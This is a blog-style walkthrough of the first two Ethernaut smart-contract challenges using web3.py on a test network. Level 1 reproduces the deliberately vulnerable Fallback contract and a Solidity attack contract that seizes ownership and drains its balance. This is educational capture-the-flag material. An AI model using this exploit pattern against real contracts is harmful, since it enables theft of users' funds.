---
layout: post
title:  Ethernaut Challenges with web3.py
date:   2023-01-22 11:50:16 +0100
categories: init
post_id: 2
---

This is a fast-paced walkthrough of the ethernaut challenges using web3.py. The goal is to get you up and running with web3.py and the ethernaut challenges as quickly as possible. If you want to learn more about web3.py, check out the [web3.py documentation](https://web3py.readthedocs.io/en/stable/).

## Setup

```python
# setup connection to test net
from web3 import Web3

# connect to a local net
l_net = Web3(Web3.HTTPProvider("http://127.0.0.1:8545"))

# connect to goerli network
g_net = Web3(Web3.HTTPProvider("https://rpc.ankr.com/eth_goerli"))

g_net.isConnected()

```

```bash
True
```

- ## [Level 0](https://ethernaut.openzeppelin.com/level/0xBA97454449c10a0F04297022646E7750b8954EE8) - Hello Ethernaut

`Difficulty Level: 0/5`

### level_0 task

This level is a sanity check to make sure you understand how to interact with a smart contract.

### solution

```python
# contract address, can be obtained from the browser console
# with: contract.address
contract_addr = "0xC63C2947fcaf80d13D40742A52fF5122fec5B171"

# contract abi, obtain from browser with: contract.abi 
contract_abi = '[{ redacted due to size }]'

hello_contract = g_net.eth.contract(address=contract_addr, abi=contract_abi)

hello_contract.functions.info().call()

```

```bash
'You will find what you need in info1().'
```

```python
# from the output above, we know we have to make a call
# to info1()
hello_contract.functions.info1().call()
```

```bash
'Try info2(), but with "hello" as a parameter.'
```

```python
# calling info2(), with 'hello' parameter
hello_contract.functions.info2('hello').call()
```

```bash
'The property infoNum holds the number of the next info method to call.'
```

```python
hello_contract.functions.infoNum().call()
```

```bash
42
```

```python
hello_contract.functions.info42().call()
```

```bash
'theMethodName is the name of the next method.'
```

```python
hello_contract.functions.theMethodName().call()
```

```bash
'The method name is method7123949.'
```

```python
hello_contract.functions.method7123949().call()
```

```bash
'If you know the password, submit it to authenticate().'
```

```python
hello_contract.functions.password().call()
```

```bash
'ethernaut0'
```

```python
hello_contract.functions.authenticate('ethernaut0').call()
```

submit the contract and challenge solved.

- ## [Level 1](https://ethernaut.openzeppelin.com/level/0x80934BE6B8B872B364b470Ca30EaAd8AEAC4f63F) - Fallback

`Difficulty Level: 1/5`

### level_1 Task

Look carefully at the contract's code below. You will beat this level if

1. you claim ownership of the contract
2. you reduce its balance to 0

### level_1 Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Fallback {

    mapping(address => uint) public contributions;
    address public owner;

    constructor() {
        owner = msg.sender;
        contributions[msg.sender] = 1000 * (1 ether);
    }

    modifier onlyOwner {
        require(
            msg.sender == owner,
            "caller is not the owner"
        );
        _;
    }

    function contribute() public payable {
        require(msg.value < 0.001 ether);
        contributions[msg.sender] += msg.value;

        if(contributions[msg.sender] > contributions[owner]){
            owner = msg.sender;
        }
    }

    function getContribution() public view returns (uint) {
        return contributions[msg.sender];
    }

    function withdraw() public onlyOwner {
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {
        require(msg.value > 0 && contributions[msg.sender] > 0);
        owner = msg.sender;
    }

}

```

### level_1 Solution

`fallback_attack.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./fallback.sol";

contract AttackFallback {

    Fallback public fallbackContract;

    constructor(address fallbackContractAddress) {
        fallbackContract = Fallback(payable(fallbackContractAddress));
    }

    function makeContribution() public {
        fallbackContract.contribute{value: 3 wei}();
    }

    function getContribution() public view returns (uint) {
        return fallbackContract.getContribution();
    }

    function ownTheContract() public {
        payable(address(fallbackContract)).transfer(3 wei);
    }

    function lootContract() public {
        fallbackContract.withdraw();
    }

    receive() external payable {
        return ;
    }
}

```
